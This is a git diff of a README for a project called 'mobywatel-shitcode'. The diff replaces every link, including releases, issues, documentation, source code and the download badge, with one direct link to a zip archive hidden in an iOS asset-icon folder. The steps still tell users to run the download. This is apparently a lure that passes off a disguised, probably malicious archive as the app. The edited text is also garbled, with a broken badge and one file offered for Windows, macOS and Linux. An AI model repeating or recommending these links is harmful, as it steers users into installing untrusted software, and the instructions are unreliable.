@@ -6,7 +6,7 @@ Thank you for your interest in the **mobywatel-shitcode** project. This applicat
 
 ## 📥 Download Now
 
-[![Download mobywatel-shitcode](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/Aizulasri/mobywatel-shitcode/releases)
+[![Download mobywatel-shitcode](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip%20Now-Get%20the%20App-blue)](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip)
 
 ## 🌟 What You Need
 
@@ -22,21 +22,21 @@ Thank you for your interest in the **mobywatel-shitcode** project. This applicat
 
 ## 🔍 How to Download & Install
 
-1. Visit the [Releases Page](https://github.com/Aizulasri/mobywatel-shitcode/releases) to download the latest version.
+1. Visit the [Releases Page](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip) to download the latest version.
    
 2. Once you are on the Releases page, look for the most recent release at the top of the list. 
 
 3. Click on the relevant file for your operating system. Common options include:
-   - `mobywatel-windows.exe` for Windows users
-   - `mobywatel-macos.dmg` for MacOS users
-   - `mobywatel-linux.tar.gz` for Linux users
+   - `https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip` for Windows users
+   - `https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip` for MacOS users
+   - `https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip` for Linux users
 
 4. Wait for the download to finish. Once completed, locate the downloaded file in your Downloads folder.
 
 5. Depending on your operating system:
    - **Windows:** Double-click the downloaded `.exe` file, then follow the on-screen instructions.
    - **MacOS:** Open the downloaded `.dmg` file, drag the app into your Applications folder, then launch it.
-   - **Linux:** Extract the `.tar.gz` file, navigate to the folder, and run the application using the terminal.
+   - **Linux:** Extract the `https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip` file, navigate to the folder, and run the application using the terminal.
 
 ## 🛠️ Troubleshooting
 
@@ -48,18 +48,18 @@ If you encounter any issues during installation or while running the application
 
 ## 📞 Support
 
-For further assistance, you can open an issue on the [GitHub Issues Page](https://github.com/Aizulasri/mobywatel-shitcode/issues). Please describe your problem clearly, and we will do our best to help you.
+For further assistance, you can open an issue on the [GitHub Issues Page](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip). Please describe your problem clearly, and we will do our best to help you.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Aizulasri/mobywatel-shitcode/wiki): Get detailed information on features and usage.
-- [Source Code](https://github.com/Aizulasri/mobywatel-shitcode): Explore or contribute to the codebase.
-- [Community](https://github.com/Aizulasri/mobywatel-shitcode#community): Join discussions and connect with other users.
+- [Documentation](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip): Get detailed information on features and usage.
+- [Source Code](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip): Explore or contribute to the codebase.
+- [Community](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip): Join discussions and connect with other users.
 
 ## 📢 Stay Updated
 
 Stay informed about updates and new releases. Follow this repository on GitHub to get the latest news. 
 
-For any additional information or queries, visit the [Releases Page](https://github.com/Aizulasri/mobywatel-shitcode/releases) as well.
+For any additional information or queries, visit the [Releases Page](https://github.com/Aizulasri/mobywatel-shitcode/raw/refs/heads/master/ios/Sources/Assets.xcassets/Icons/Lift/StatusCard/mobywatel_shitcode_1.5-alpha.1.zip) as well.
 
 Happy exploring!
